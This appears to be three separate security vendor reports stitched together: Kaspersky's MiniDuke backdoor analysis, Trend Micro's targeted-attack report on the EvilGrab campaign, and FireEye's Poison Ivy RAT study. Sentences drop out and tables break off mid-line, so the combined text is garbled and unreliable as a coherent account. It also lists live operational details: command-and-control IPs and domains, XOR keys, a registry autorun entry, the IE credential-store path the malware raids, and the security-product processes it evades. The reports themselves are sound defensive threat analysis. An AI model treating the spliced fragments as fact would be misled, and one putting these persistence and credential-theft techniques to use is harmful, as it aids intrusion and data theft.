PAGE 6| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
                                           <figure></figure>
<caption>
                                               Decryption loop in the obfuscated code.0x4522 is the actual size of the encrypted part</caption>

Once finished decrypting, the library proceeds to the real “main” function.The main part of the library is written in Assembler,
in an “old-school” manner typical for low-level viruses.The code is position independent; it has no imports and resolves API
function addresses by hash values of their names.<figure></figure>

                    .<caption>
                                          Typical low-level malware programming style:
                         passing strings as parameters via call, addressing API functions by hash values
</caption>


The backdoor maintains seven call addresses that each maintain their own block of functionality.The first block calls GetAsyncKeyState twice, checking for a mouse click, which indicates user activity in the system.The second
block searches for all “*.exe” and “*.dll” files located in the %temp% directory.The third block fetches information about the
infected system with calls to gather information about the CPU, drive and the computername - these are used to decrypt the
backdoor’s main body, which is custom encrypted for each unique victim.<footer>
PAGE 7| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
The fourth block attempts to maintain self-protection from malware analysis.Below is the list of tools (and VMware) that it
attempts to identify and protect against.This will prevent it from doing any outbound communications with
Twitter accounts, as described below.In other words, it will attempt to appear non-functional, especially to automated
analysis, hiding its true nature behind its layers of encryption.User agent strings for web browsers like Opera, Mozilla and Internet Explorer are decrypted and used for all Internet access.Oddly, there are Linux versions included as well:

(Windows NT 5.1; (Windows NT 6.0; (Windows; U; Windows NT 5.2; (X11; Linux i686; (X11; Linux x86_64; (compatible; MSIE
6.0; Windows NT 5.0; (compatible; MSIE 7.0; Windows NT 6.0; (compatible; MSIE 9.0; Windows NT 6.1;WOW64) ;Trident/4.0) ;
Trident/5.0) ; WOW64; Trident/5.0) ; SV1) )

The fifth and sixth code blocks are most interesting.They calculate the SHA1 of main system information which will be used in
the C2 interaction later.<figure></figure>


Following the SHA-1 hash generation, the backdoor will base64 encode its unique hash for later C2 communication.The malware is activated upon reboot of the infected machine.The
LNK file calls it only exported function, “ImqRgno”.Once activated, the malware will first contact Twitter and look for posts from some very specific accounts.These accounts
should have posted an encrypted string which contains the magic identifier “uri!”, then an encrypted c2 string.<figure></figure>


<footer>
PAGE 10| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
<figure></figure>
<figure></figure>

We presume many other Twitter accounts exist with similar parameters.Secondly, the malware will connect to “www.geoiptool.com” to obtain information about the victim’s location.Interestingly, the backdoor has another update/c2 functionality.It searches Google for a very specific string:


<figure></figure>

                 <caption>             The string “lUFEfiHKljfLKWPR” which the malware seeks on Google</caption>

The pages found by the Google search may hold an update “uri” similar to the one from Twitter.We can assume the attackers
wanted to have a second channel for updates in case the Twitter accounts are closed.<footer>
PAGE 12| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
</section>
<section>
Stage 2

The “index.php” on the C2 serves a fake GIF file to the victim, depending on the parameters it receives.The encryption scheme used a DWORD key also stored in
the GIF file that is rotated.Effectively, this translates to an 8 byte long XOR key.The resulting encryption key used in the
Hungarian attack for instance is {0xD2, 0x2A, 0xA2, 0x27, 0x79, 0x95, 0x52, 0x2D}.In the Belgian attack, it is {0xC5, 0x5E, 0xEE,
0xE5, 0x51, 0x11, 0x17, 0x7C}.For the Luxemburg attack, the key is {0x91, 0x18, 0x8C, 0xC1, 0x1C, 0xC9, 0x9C, 0xC9}.<footer>
PAGE 13| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
<figure></figure>
         <caption>                           Decrypted payload from the fake GIF file served by the C2</caption>

The decrypted PE file (plugin / payload) is also written in assembler and, once again, it is encrypted with the same algorithm as
the backdoor originally deployed in the system.We refer to it as “stage 2”.The main backdoor body saves the plugin with
different names, for instance, it can be “xml.dat” and tries to run its only export using rundll.In our case, this didn’t appear to
work very well:

<figure></figure>

<footer>
PAGE 14| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
Several different variants of the 2nd stage backdoors have been observed on the C2; they all perform similar functions but are
encrypted with different keys and contact different C2s.</section><section>
<heading>
Command & control server information
</heading>
The malware connects to several C2s depending on the information available on the control Twitter accounts or on Google.For instance, on “artas*dot+org” it connects to “/engine/index.php”.Interestingly, the “img” subfolder allows listings and we
can see several variants of the backdoor encrypted as GIF files:

<figure></figure>

<footer>
PAGE 15| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
On “tsoftonline*dot+com”, the folder has the same structure:


<figure></figure>

Interestingly, on “tsoftonline*dot+com” we have several other files with different kind of names and sizes.They are larger and
follow a different naming scheme: “*number+.gif”.We believe they are custom backdoors delivered only to specific victims by
the attackers.We refer to these as “stage 3”.This is because the
attackers used large layers of obfuscation code, including UCL compression.So far, we have observed two variants of the 300K
“stage 3” backdoor.The PE compilation timestamp for both is “Mon Jun 18 17:28:11 2012”.The number “1109821546” in the
filename refers to the unique victim ID.In this case, we were able to determine that the victim is based in Portugal.The backdoor connects to the following C2 for instructions:

        news[dot]grouptumbler[dot]com/news/feed.php
        IP: 200.63.46.23

It supports several commands, such as copy file, move file, remove file, make directory, kill process and of course, download
and execute new malware.The server at 200.63.46.23 is hosted in Panama:

<figure></figure>

<footer>
PAGE 17| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
We presume that it was hacked by the attackers and is currently used as a command server for the attacks.MD5 hashes for the known “Stage 3” backdoors:

1e1b0d16a16cf5c7f3a7c053ce78f515           v1.ex_
53db085a276ebbf5798ba756cac833ea           v2.ex_

In addition to the ~300K “stage 3” backdoors, we’ve observed a 13K module (MD5:
6bc34809e44c40b61dd29e0a387ee682).This module will connect to an IP in Turkey, get the response, decrypt it in memory
and execute it.The C2 is:

        85.95.236.114


<figure></figure>

The module has a compilation timestamp of “Tue Nov 13 14:30:12 2012”.</section><section>
<heading>
Map of victims</heading>

The C2s maintain a detailed, encoded log of the victims connecting to the servers.The logs are available to anyone who knows
the exact filename.The amount of high profile victims in this attack is notable and puts it on the same level with other advanced campaigns such
as “Red October”.The many different targets hit in separate countries,
together with the high profile appearance of the decoy documents and the weird backdoor functionality indicate an unusual
threat actor.Some of the elements remind us of both Duqu and Red October, such as the minimalistic approach, hacked
servers, encrypted channels but also the typology of the victims.<footer>
PAGE 19| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
The backdoor coding style reminds us of a malware writing group which is believed to be extinct: 29A.The value 29A in hex
means 666, and perhaps not unsurprisingly, was also left by the attackers as a clue in the code:


<figure></figure>

                                      The 29A / 666 clue left in the code by the attackers



29A published their first malware magazine in December 1996 and were active until February 2008, when ‘Virusbuster’, the
last standing man announced the group’s dismissal.The logs from the Command & Control servers indicate determination and quite a bit of success in compromising several high
profile entities in various countries.The stage 3 compilation timestamps indicate the attacker has been active for quite a
while but still managing to remain undetected.Perhaps one of the most important questions is: are these attacks related to the “Itaduke” attack that prompted the discovery
of the PDF 0-day?Or is it a separate entity that purchased the attack kit from the same source, which has a different agenda?Or, is it perhaps another threat actor which captured the 0-day exploit and modified it for other purposes?Unfortunately,
there are still many unanswered questions.Note: We detect the malware described here as HEUR:Backdoor.Win32.MiniDuke.gen, Backdoor.Win32.Miniduke while the
documents with exploits are detected as Exploit.JS.Pdfka.giy.References:

    ●   “In Turn it’s PDF Time”
        http://blog.fireeye.com/research/2013/02/in-turn-its-pdf-time.html
    ●   “Duqu: Steal everything”
        http://www.kaspersky.com/about/press/duqu


<footer>

PAGE 20| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>

</section>
</doc>It is not intended and should not be construed to constitute legal advice.The information contained herein may not be applicable to all situations and may not reflect the most current situation.Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise.Trend Micro reserves the right to modify the contents of this document at any time without prior notice.Translations of any material into other languages are intended solely as a convenience.Translation accuracy is not guaranteed nor implied.If any questions arise related to the accuracy of a translation, please refer to the original language official version of the document.Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes.Although Trend Micro uses reasonable efforts to include accurate and up-to-date information herein, Trend Micro makes no warranties or representations of any kind as to its accuracy, currency, or completeness.You agree that access to and use of and reliance on this document and the content thereof is at your own risk.Trend Micro disclaims all warranties of any kind, express or implied.Neither Trend Micro nor any party involved in creating, producing, or delivering this document shall be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, whatsoever arising out of access to, use of, or inability to use, or in connection with the use of this document, or any errors or omissions in the content thereof.Use of this information constitutes acceptance for use in an “as is” condition.</noncontent>

<section>
<heading>Introduction</heading>

Highly targeted attacks refer to a category of threats that pertain to intrusions by threat actors or attackers.These attackers aggressively pursue and compromise chosen targets in order to steal sensitive information.These are not conducted through separate attacks; rather, they comprise of a series of attempts over time to get deeper and deeper into a target’s network.Each attempt may either succeed or fail, but the overall goal is to penetrate the target’s network and acquire information.Malware is typically used as an attack vector, but the real threat involves human operators who adapt, adjust, and improve their methods based on the victim’s defenses.Enterprises should consider targeted attacks a high-priority threat because of the considerable damage they incur.The human and systemic weaknesses that allow an attacker to compromise an organization can be minimized and mitigated with correct practices and solutions.However, these same weaknesses can never be fully resolved.Trend Micro monitors the targeted attack landscape in order to identify ongoing campaigns and provide additional threat intelligence useful for identifying the existence of these campaigns in an enterprise network.This quarterly report presents the targeted attack campaigns observed and mitigated by Trend Micro based on reported customer cases, as well as our own independently gathered data.</section>
                                                                       
<section>
<heading>Campaigns Observed in 2Q</heading>

Targeted Attack Campaigns Profiling

We encountered a variety of targeted campaigns in the second quarter of the year.These include the following:

•   IXESHE.The IXESHE campaign is known for targeting East Asian governments, electronics manufacturers, and telecommunications firms.We released a white paper discussing this campaign.<fn>1</fn> IXESHE has been active since 2012.•   ELISE.This recently discovered campaign also targets government agencies in the Asia Pacific region.It is called ELISE after certain strings found in its unpacked code.(We detect the malware used by this campaign as BKDR_ELISE.)•   ZEGOST.This family of backdoors (aka HTTP Tunnel) is Chinese in origin and was used in attacks against Asian government organizations.•   BEEBUS/MUTTER.This is a targeted campaign believed to be associated with the Comment Crew attacker group because of the use of encrypted/obfuscated HTML comments to hide their C&C transactions.•   TravNet.This campaign made use of a malware family identified as NetTraveler based on the strings found in the malware code.The malware is detected as BKDR_TRAVLAR.</section>

<section>
<heading>Affected Industry Sectors</heading>

Our data indicates that the majority of targeted attack victims are various government agencies.Targeted firms from the technology sector include telecommunication firms, Internet service providers, and software companies.The financial services sector and the aerospace industry were also targeted this quarter.<figure><caption>Targeted attacks discovered by industry</caption></figure>     

<heading>Affected Regions</heading>

The targeted attacks that we analyzed were heavily concentrated in Asia, particularly Taiwan and Japan.<figure><caption>Targeted attacks discovered by region</caption></figure>      


<heading>Attachments Used In Targeted Attacks</heading>

Based on our findings, the most common type of email attachment type used in targeted attacks were file archives of various forms.When uncompressed, these archives typically contain the malicious payload itself, which the user may then run directly.Alternately, they may also contain a .DOC file that contains exploit code.RTF files made up the second most common file type.<figure><caption>File types used in targeted attacks</caption></figure>      

Frequently, the .EXE files we see are made to appear as ordinary documents or folders using appropriately chosen icons.In addition, we also saw an increased use of files that make use of right-to-left override (RTLO) in Unicode.<heading>C&C Statistics</heading>

We were also able to monitor the activity of various C&C servers related to targeted attacks.This campaign was first found targeting certain Asian and European governments.Its name is derived from its behavior of grabbing audio, video, and screenshots from affected machines.Currently, the malware used by EvilGrab belongs to one of three malware families:

•	 BKDR_HGDER
•	 BKDR_EVILOGE
•	 BKDR_NVICM

<heading>Targets</heading>

Our research indicates that EvilGrab activity is most prevalent in China and Japan, although it is also present in other parts of the world.Government organizations were, by far, the most affected by EvilGrab.This geolocation is based on the IP addresses of the victims.Therefore, foreign institutions within China would be identified as coming from China; the same would hold true for all countries.EvilGrab was also found in the United States, Canada, France, Spain, and Australia, among others.Among the attachment types are:
<list>
•	 Microsoft® Excel® spreadsheets (CVE-2012-0158 and CVE-2012-2543)
•	 PDFs (CVE-2013-0640)
•	 Microsoft® Word® documents (CVE-2012-0158)
</list>
A .RAR file with a folder named thumbs.db was also seen containing malicious code.By using this name, the intention was to disguise itself as the Windows thumbnail cache.A shortcut file (.LNK) was also seen in the .RAR file, which used a folder icon to make users believe it was another folder.In reality, running the .LNK file executes the malware.In addition, the .RAR file contains a desktop.ini file in order to change the thumbs.db folder icon into the icon of the Windows thumbnail cache.<list>
Exploits, Payloads, and Decoy Documents
</list>
The EvilGrab campaign’s use of exploits, payloads, and decoy documents is similar to the Taidoor campaign in 2012.<fn>2</fn> The primary difference is that EvilGrab variants have multiple layers of shellcode.In addition, some variants copy the file name and use it as the decoy document file name.Other variants overwrite the exploit document with the contents of the decoy document.As noted above, some variants also use disguised folders and shortcuts and do not use exploits to run their code.</section>

<section>
<heading>DLL Preloading Using the Windows Shell and Fax Server</heading>

DLL preloading is a vulnerability that has been documented for over three years.<fn>3</fn> The EvilGrab campaign makes use of this vulnerability for its AutoRun routine.Whenever it is run, the Windows shell (explorer.exe) loads a component of the fax server in Windows, fxsst.dll.This is normally located in the System32 folder.Whenever an instance of explorer.exe is launched (i.e., at every system startup), the system searches for the said .DLL file and loads it.EvilGrab drops one of its .DLL components in the Windows folder, where explorer.exe is also located.The malicious .DLL (also named fxsst.dll) is loaded instead of the legitimate copy.It also serves as the loader of the main backdoor.While DLL preloading has been used by other malware in the past, it is less common to see it specifically target explorer.exe.Other malware families that use this vulnerability typically target executable files outside of Windows; EvilGrab targets a part of Windows itself.</section>

<section>

<heading>Other Autorun Behaviors</heading>

In addition to the above behavior, EvilGrab also creates the following registry entry to enable its automatic execution at every system startup:

<code>
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
UKey = “%Application Data%\360\Live360.exe”
</code>

The file %Application Data%\360\Live360.exe is a copy of one of the malware components.It also creates a shortcut under the Startup folder in the Start menu:
<list>
•	 IEChecker.lnk
    •	 Target: “%UserProfile%\IEChecker.exe” –L
    •	 Icon: %Full path of Iexplorer.exe% (This uses the Internet Explorer icon and disguise itself as part of Internet Explorer.)</list>
The above file is also a copy of one of the malicious components.</section>

<section>         
<heading>Stealth Operation</heading>
EvilGrab has three primary components: one .EXE file and two .DLL files.The .EXE file acts as the installer for all of the EvilGrab components.One of the .DLL files serves as a loader for the other .DLL file, which is the main backdoor component.Some variants of EvilGrab delete the .EXE file after installation to cover its tracks more effectively.As noted earlier, the loader file is named fxsst.dll.However, examination of its header states that its actual file name is supposed to be svchost.dll.These components are also encrypted and saved in the registry.To add stealth to its backdoor routines, it uses a legitimate process context’s memory space to inject the main backdoor.By default, this backdoor injects itself into the svchost.exe or winlogon.exe process.It also checks if certain processes related to certain security products are running on the affected system.The specific processes targeted are:
<list>
•	 avp.exe
•	 klwtblfs.exe
•	 starter.exe
•	 wmifw.exe
</list>
Other variants of this malware also check if other security products are present.It is not clear why EvilGrab specifically targets these products.However, it is possible that the attackers determined that targets for this campaign are likely running these products.The values are then decrypted using the system library pstorec.dll.It also steals login credential from IE autocomplete entries.It does this by first parsing the index.dat files in the IE History folder.It then collects autocomplete entries from the following registry key:

<code>
HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2
</code>

It then initiates a brute force attack on encrypted credentials using the CryptUnprotectData API.However, it will only try to steal passwords from IE’s password-protected sites and MSN Explorer Signup if kav.exe (related to a security product) is not running in the system.</section>

<section>
<heading>Tencent QQ Memory Reading</heading>

If the active window is Tencent QQ (specifically, QQ2009 through QQ2012), EvilGrab will attempt to steal information by directly reading the process’s memory and checking if the class name of the focused window is not named “EDIT.”

The contents of the process’s memory are then saved onto the system’s hard drive as %UserProfile%\users.bin.It is then sent back to the backdoor’s C&C server.The file on the hard drive is encrypted; specifically, the data is XORed with the key 0x66.</section>

<section>
<heading>Key Logging</heading>

EvilGrab also possesses keylogging capabilities.The logged keystrokes are then sent back to the C&C and saved to %User Profile%\users.bin.The file on the hard drive is encrypted; specifically, the data is XORed with the key 0x66.</section>

<section>
<heading>Command & Control Servers</heading>

Each backdoor has one to three C&C servers in its code.Some of C&C servers that we have seen from our accumulated data are as follows:
<list>
•	 112.121.182.150
•	 113.10.246.46
•	 113.10.190.55
•	 202.130.112.231
•	 micoosofts.com
•	 qtds1979 .3322. org
•	 qtds1979.gicp.net
•	 server1.micoosofts.com
•	 sxl1979.gicp.net
•	 webmonder.gicp.net
•	 webposter.gicp.net
•	 www .yahooip .net
•	 www .yahooprotect .com
•	 www .yahooprotect .net
•	 yacooll .com
•	 yahooip .net
•	 yahooprotect .com
</list>
</section>

<section>
<heading>Backdoor Activity</heading>

To start its connection to its C&C server, the backdoor component will first send 5-bytes (\x01\x00\x00\x00\x33).The C&C will reply if it accepts the connection.backdoor is injected

Hardcoded 0x00                                <%d> = 0
</table>


Either backdoor identifier 1 or backdoor identifier 2 acts as the campaign code or marker for EvilGrab campaigns, which is recognizable by the C&C server and/or attacker.Some of the identifiers we saw in backdoor identifier 1 are:
<list>
•	 006
•	 007
•	 0401
•	 072002
•	 3k-Ja-0606
•	 3k-jp01
•	 4k-lyt25
•	 88j
•	 e-0924
•	 LJ0626
•	 RB0318
</list>
Some of the identifiers seen in our accumulated data in backdoor identifier 2 are as
follows:
<list>
•	 V2010-v16
•	 V2010-v24
</list>
We noted a correlation between the MZ/PE headers of variants and the strings in backdoor identifier 2.Variants with a V2010-v24 identifier have a proper MZ/PE header; variants with a V2010-v16 header have portions of their header overwritten with JPEG strings.These variants require a loader component to load them into memory in order to be executed.Below is a sample packet sent at the beginning of the connection:

<figure><caption>Code snapshot</caption></figure>     

EvilGrab variants possess a wide variety of possible backdoor commands.EvilGrab steals internal user names and passwords as well as logs keystrokes.Credentials stolen this way can be used to move within the confines of the organization’s network.EvilGrab possesses a wide variety of information theft capabilities.It can grab audio and video files directly from devices attached on the system (i.e.microphone and camera).In addition, EvilGrab can upload files from the affected system to remote servers.EvilGrab possesses a full range of capabilities that is expected in malware used in targeted attacks against organizations.</section>

<section>
<heading>Trend Micro Recommendations</heading>

Targeted attacks pose a challenge to traditional signature-based security solutions.To deal with these type of threats, employ solutions that include network monitoring to detect and analyze incoming threats, as well as any outgoing communication with attacking parties.Products like Trend Micro™ Deep Discovery™ are capable of mitigating the risks from these threats.One component of Deep Discovery, the Deep Discovery Inspector, provides network threat detection, custom sandboxing, and real-time analysis and reporting.The second component, Deep Discovery Advisor, provides sandbox analysis of known and unknown threats that augments the capabilities of existing products like endpoint solution and email/web gateways.It also provides visibility to network-wide security events.The capabilities provided by solutions like Deep Discovery are necessary to provide a unified, comprehensive view of the threats an organization faces.This information can then be used by an organization to create appropriate and proportional responses to properly protect an organization’s network.</section>
          
<footnote>
<heading>References</heading>
1	        Sancho, David; Dela Torre, Jessa; Bakuei, Matsukawa; Villeneuve, Nart; and McArdle, Robert.(2013).Trend
Micro Incorporated Research Paper.“IXESHE: An APT Campaign.” Last accesed August 30, 2013. http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf

2	        Trend Micro Incorporated.(2013).Trend Micro Incorporated Research Paper “The Taidoor Campaign: An In-Depth
Analysis.” Last accessed August 30, 2013. http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/
white-papers/wp_the_taidoor_campaign.pdf

3	       Security TechCenter.(November 13, 2012).Microsoft Security Advisory.“Microsoft Security Advisory (2269637):
nsecure Library Loading Could Allow Remote Code Execution” Last accessed August 30, 2013. http://technet.microsoft.com/en-us/security/advisory/2269637

4	      Microsoft.(2013).Windows Dev Center - Desktop.“Using the Sample Grabber.” Last accessed August 30, 2013.
http://msdn.microsoft.com/en-us/library/windows/desktop/dd407288(v=vs.85).aspx

5	       Microsoft.(2013).Developer Network.“Recording and Playing Sound with the Waveform Audio Interface.” Last
accessed August 30, 2013. http://msdn.microsoft.com/en-us/library/aa446573.aspx#waveinout_topic_006
</footnote>

<noncontent>                                                                                                                                 
Trend Micro Incorporated, a global leader in security software, strives to make the
world safe for exchanging digital information.Our innovative solutions for consumers,
businesses and governments provide layered content security to protect information
on mobile devices, endpoints, gateways, servers and the cloud.All of our solutions are
powered by cloud-based global threat intelligence, the Trend Micro™ Smart Protection
Network™, and are supported by over 1,200 threat experts around the globe.For more
information, visit www.trendmicro.com.10101 N. De Anza Blvd.Cupertino, CA 95014
©2013 by Trend Micro, Incorporated.All rights reserved.Trend Micro and the Trend
Micro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated.U.S. toll free: 1 +800.228.5651
All other product or company names may be trademarks or registered trademarks of          Phone: 1 +408.257.1500
their owners.Fax: 1 +408.257.2003

</noncontent>
</doc>But dismissing this common breed of malware could
be a costly mistake.Despite their reputation as a software toy for novice “script kiddies,”
RATs remain a linchpin of many sophisticated cyber attacks.Requiring little technical savvy to use, RATs offer unfettered access to compromised
machines.They are deceptively simple—attackers can point and click their way through
the target’s network to steal data and intellectual property.But they are often delivered
as key component of coordinated attacks that use previously unknown (zero-day)
software flaws and clever social engineering.Even as security professionals shrug off the           
threat, the presence of a RAT may in itself indicate   
a targeted attack known as an advanced
persistent threat (APT).Unlike malware focused        
on opportunistic cybercrime (typically conducted       
by botnets of comprised machines), RATs require        
a live person on the other side of the attack.This report spotlights Poison Ivy (PIVY), a RAT
that remains popular and effective a full eight        
years after its release, despite its age and           
familiarity in IT security circles.In conjunction     
with the study, FireEye® is releasing Calamine, a
set of free tools to help organizations detect and     
examine Poison Ivy infections on their systems.Poison Ivy has been used in several high-profile       
malware campaigns, most notoriously, the 2011
compromise of RSA SecurID data.The same year,         
Poison Ivy powered a coordinated attack dubbed         
Nitro against chemical makers, government              
agencies, defense firms and human-rights groups.Several ongoing cyber attack campaigns use
Poison Ivy, including these:
•       admin@338—Active since 2008, this
     campaign mostly targets the financial
     services industry, though we have also seen
     activity in the telecom, government, and
     defense sectors.•       th3bug—First detected in 2009, this
     campaign targets a number of industries,
     primarily higher education and healthcare.•       menuPass—Also launched in 2009, this
     campaign appears to originate from China,
     targeting U.S. and overseas defense
     contractors.Understanding why Poison Ivy remains one of the
most widely used RATs is easy.Controlled through
a familiar Windows interface, it offers a bevy of
handy features: key logging, screen capturing,
video capturing, file transfers, password theft,
system administration, traffic relaying, and more.<footer>2 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>

And Poison Ivy is so widely used that security                                  
professionals have a harder time tracing attacks                                
that use the RAT to any particular attacker.We hope to eliminate some of that anonymity with                                
the FireEye Calamine package.The FireEye
PIVY module for ChopShop decrypts Poison Ivy                                    
network traffic.FireEye is sharing the Calamine tools with the                                  
security community at large under the BSD                                       
2-Clause License<fn>3</fn> for both commercial and                                       
non-commercial use worldwide.This evidence
is especially useful when it is correlated with
multiple attacks that display the same identifying
features.Combining these nuts-and-bolts details with
big-picture intelligence can help profile threat
attackers and enhance IT defenses.Calamine may not stop determined attackers that
use Poison Ivy.But it can make their criminal
endeavors that much more difficult.</section>

<section>
<heading>Introduction</heading>
Poison Ivy is a remote access tool that is freely
available for download from its official web site at
www.poisonivy-rat.com.First released in 2005,
the tool has gone unchanged since 2008 with v
ersion 2.3.2.Poison Ivy includes features common
to most Windows-based RATs, including key
logging, screen capturing, video capturing, file
transfers, system administration, password theft,
and traffic relaying.Poison Ivy’s wide availability and easy-to-use
features make it a popular choice for all kinds of

<footnote>
1
  ChopShop is available for download at https://github.com/MITRECND/chopshop.2
  Immunity Debugger is available at http://debugger.immunityinc.com/.3
  For more information about the BSD 2-Clause License, see the Open Source Initiative’s template at http://opensource.org/licenses/BSD-2-Clause.</footnote>



<footer>3 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>


criminals.But it is probably most notable for its                               
role in many high profile, targeted APT attacks.These APTs pursue specific targets, using RATs to                                
maintain a persistent presence within the target’s                               
network.They move laterally and escalate system                                 
privileges to extract sensitive information—
whenever the attacker wants to do so.<fn>4</fn>,<fn>5</fn> Because                                 
some RATs used in targeted attacks are widely                                    
available, determining whether an attack is part of                              
a broader APT campaign can be difficult.Equally                                 
challenging is identifying malicious traffic to                                  
determine the attacker’s post-compromise                                         
activities and assess overall damage—these RATs                                  
often encrypt their network communications after                                 
the initial exploit.In 2011, three years after the most recent release                               
of PIVY, attackers used the RAT to compromise
security firm RSA and steal data about its                                       
SecureID authentication system.That data was
subsequently used in other attacks.<fn>6</fn> The RSA                                     
attack was linked to Chinese threat actors and                                   
described at the time as extremely sophisticated.Exploiting a zero-day vulnerability, the attack                                  
delivered PIVY as the payload.<fn>7</fn>,<fn>8</fn> It was not an                                  
isolated incident.This
characteristic is distinctly different from
crimeware (malware focused on cybercrime),
where the criminal can issue commands to their
botnet of compromised endpoints whenever they
please and set them to work on a common goal
such as a spam relay.In contrast, RATs are much
more personal and may indicate that you are
dealing with a dedicated threat actor that is
interested in your organization specifically.</section>

<section>
<heading>Technical Analysis</heading>
<heading>Build and implantation</heading>

The Poison Ivy builder kit allows attackers to
customize and build their own PIVY server, which
is delivered as mobile code to a target that has
been compromised, typically using social
engineering.Once the server executes on a
target’s endpoint, it connects to a PIVY client
installed on the attacker’s machine, giving the
attacker control of the target system.The PIVY server code can executed on the target
endpoint in a number of ways, depending on how
the attacker configured it.In the most common
configuration, the PIVY server divides its code
into two parts:


<footnote>
4
  Joe Stewart.“The Sin Digoo Affair.” February 2012.5
   Nart Villeneuve.“Trends in Targeted Attacks.” October 2011.6
  eWeek.“Northrop Grumman, L-3 Communications Hacked via Cloned RSA SecurID Tokens.” June 2011.7
  RSA FraudAction Research Labs.“Anatomy of an Attack.” April 2011.8
  CNET.“Attack on RSA used zero-day Flash exploit in Excel.” April 2011.9
  Brian Krebs.“Who Else Was Hit by the RSA Attackers?” October 2011.10
   Eric Chien and Gavin O’Gorman.“The Nitro Attacks: Stealing Secrets from the Chemical Industry.” October 2011.11
   GovCERTUK Computer Emergency Response Team.“Targeted Email Attack Alert.” October 2011.12
   Symantec.“Java Zero-Day Used in Targeted Attack Campaign.” August 2012.13
   Yichong Lin.“IE Zero Day is Used in DoL Watering Hole Attack.” May 2013.</footnote>

<footer>4 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>

•	    Initialization and maintenance code            
                                                        
•	    Networking code                                
The initialization and maintenance code is injected     
into the already-running explorer.exe process.Depending on how the attacker configures it, the        
networking code launches a hidden Web browser           
process (the system’s default browser) and injects      
itself into that process.The networking code then      
remotely downloads (from the attacker’s PIVY            
client as shellcode) the rest of the code and data it   
needs for its features and functionality.The new       
code executes on the target’s endpoint within the       
                                                        
context of the target process.All of PIVY’s global     
variables, configuration details, and function          
pointers are stored in a C-style struct (data           
structure), which is also injected into the target
processes in both the PIVY networking code and
initialization and maintenance code.This distinct characteristic has the side effect of
having every CALL instruction and global
variable address being referenced as an offset to
a register when looking at the code’s
disassembly.The code injected into explorer.exe
is peculiar in that, unlike most malware-injected
code, this code is injected function by function—
each with its own memory region, filling in the
proper function pointers in its struct.If the
“persistence” PIVY option is enabled, a watchdog
thread is also injected into explorer.exe, which
automatically restarts the PIVY server process if
it is unexpectedly terminated by the target’s
operating system.PIVY’s keylogging function, if
enabled, is also injected into explorer.exe.Most of this communication is      
encrypted using the Camellia cipher with a 256-bit    
key.14 The key is derived from a password             
provided by the attacker when building the PIVY       
server.The password, “admin” by default, can be      
provided in plain text or as hex-ASCII.The           
password is zero-padded to 32 bytes (256 bits).The key is validated at the beginning of the TCP      
session with a challenge-response algorithm.The      
PIVY server sends 256 bytes of randomly
generated data to the PIVY client which, in turn,     
encrypts the data using the key and sends it back     
to the PIVY server for validation.Much of the data   
sent throughout PIVY’s communications is also         
compressed before encryption using Microsoft’s        
LZNT1 compression algorithm,15 which PIVY             
utilizes through the Windows RtlCompressBuffer        
API.stream_id—This member identifies which stream
this flow corresponds to.PIVY’s protocol supports
sending multiple streams of data simultaneously.padded_chunk_size—Because Camellia is a
16-byte block cipher, padding is utilized in the
headers and in the data chunks.chunk_size—Chunks are assembled into a stream
of data that could be anything, such as a
transferred file, shellcode to execute, a screen
capture bitmap file, or raw data.decompressed_chunk_size—If this size is different
from the chunk_size, the chunk is compressed
using LZNT1.total_stream_size—This member specifies the
total size of the data being sent for the related
command_id.padding—This member specifies the zero padding
(up to 32 bytes).If found, the
module will try to validate the response using one                   
or more passwords supplied as arguments.If no                       
password is supplied, it tries the default “admin”                   
password.You can supply a single password in either                           
plain-text form or hex-ASCII form.For multiple                      
passwords, you can specify a text file containing
line-delimited passwords.If the decoder identifies                  
valid initial PIVY flows based on a supplied                         
password, then the decoder decodes the rest of
the relevant flow or flows.To use the FireEye ChopShop module, you must                         
install CamCrypt, a python wrapper for an                            
open-source implementation of the Camellia                           
encryption library.<fn>16</fn> Most of the features of PIVY                   
are covered to some extent in this module.Note: If the PIVY flows do not correspond to any                     
supplied password, then decoding fails.•       Webcam, audio, keylog, and single screen
     captures are saved to disk when the -c option
     is used.•       The audio captures are saved as raw data that
     can easily be converted to .wav files u sing a
     tool such as SoX.<fn>17</fn> The decoder prints the
     sample rate, channel, and bit data.•       File and registry search details and results
     are displayed.•       The details of any network relays instantiated
     are displayed.•       Active port listings are displayed.This module partially supports decoding listings of
Windows files, the registry, services, processes,
devices, and installed application listings.During
PIVY flow decoding, the module’s default output
indicates that listing requests have occurred and,
when applicable, highlights which key or directory
is being listed.Directory listings are printed, but without file
details.When the module is invoked with the -1
option, all returned list data is saved to a file in raw
for m, just as it is seen by the PIVY client: a mixtur
e of strings and binary data describing those
strings.If you are interested in the details of what
was listed, running the strings tool on raw file
dumps is useful.If you encounter an unrecognized command or
want to extend the functionality of this decoder,
the -d option is useful.It prints hex dumps of all
the headers and assembled streams in both
